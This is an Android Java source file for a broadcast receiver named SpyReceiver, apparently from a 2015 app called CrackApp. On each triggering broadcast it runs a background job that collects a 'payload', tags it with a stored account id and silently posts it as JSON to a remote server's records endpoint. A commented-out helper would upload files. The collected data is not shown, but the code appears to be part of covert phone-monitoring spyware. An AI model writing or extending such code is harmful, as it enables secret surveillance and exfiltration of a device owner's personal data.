package co.poweramp.crackapp.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Handler;
import android.provider.Settings;
import android.util.Log;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.loopj.android.http.AsyncHttpClient;

import co.poweramp.crackapp.Constants;
import co.poweramp.crackapp.R;
import cz.msebera.android.httpclient.Header;
import cz.msebera.android.httpclient.entity.StringEntity;

/**
 * CrackApp
 * <p/>
 * Created by duncan on 22/11/15.
 * Copyright (c) 2015 Duncan Leo. All Rights Reserved.
 */
public class SpyReceiver extends BroadcastReceiver {
    private final String TAG = "SpyReceiver"; //TODO: FIx BASE URL
    private AsyncHttpClient httpClient;

    @Override
    public void onReceive(final Context context, Intent intent) {
        if (httpClient == null) {
            httpClient = new AsyncHttpClient();
        }
        SharedPreferences sharedPref = context.getSharedPreferences(context.getString(R.string.preference_account_id), Context.MODE_PRIVATE);
        final int accountId = sharedPref.getInt("accountId", -1);
        if (accountId == -1) {
            Log.d(TAG, "Account id is -1, ignored!");
            return;
        }
        final Handler handler = new Handler();
        new Job(context, new Job.JobListener() {
            @Override
            public void onComplete(final Payload p) {
                handler.post(new Runnable() {
                    @Override
                    public void run() {
                        p.setAccountId(accountId);
                        submitPayload(context, p);
                    }
                });
            }
        });
    }

    /**
     * Submit a payload
     * @param context
     * @param p
     */
    private void submitPayload(Context context, Payload p) {
        final Gson gson = new GsonBuilder().registerTypeAdapter(Payload.class, new PayloadSerialiser()).setPrettyPrinting().create();
        String json = gson.toJson(p);
        StringEntity entity;
        try {
            entity = new StringEntity(json);
        } catch (Exception e) {
            e.printStackTrace();
            return;
        }
        Log.d(TAG, "Sending JSON: " + json);
        httpClient.post(context, Constants.BASE_URL + "/records/add", entity, "application/json", new SaneAsyncHttpResponseHandler() {
            @Override
            public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
                Log.d(TAG, "Sent payload to server successfully.");
                String resp = new String(responseBody);
                Log.d(TAG, "Server response: " + resp);
            }

            @Override
            public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
                Log.d(TAG, "Failed to send payload to server: " + statusCode);
                String resp = new String(responseBody);
                Log.d(TAG, "Server response: " + resp);
            }
        });
    }



    private String getUniqueDeviceId(final Context context) {
        return Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
    }

//    private void sendData(Context context, Map<String, Object> formData) {
//        RequestParams params = new RequestParams();
//        for (Map.Entry<String, Object> data : formData.entrySet()) {
//            if (data.getValue() instanceof byte[]) {
//                params.put("file", new ByteArrayInputStream((byte[])data.getValue()), data.getKey());
//            } else {
//                params.put(data.getKey(), data.getValue());
//            }
//        }
//        httpClient.post(context, URL, params, new AsyncHttpResponseHandler() {
//            @Override
//            public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
//                Log.i(TAG, "Success!");
//            }
//
//            @Override
//            public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
//                Log.i(TAG, "Failure!");
//            }
//        });
//    }
}
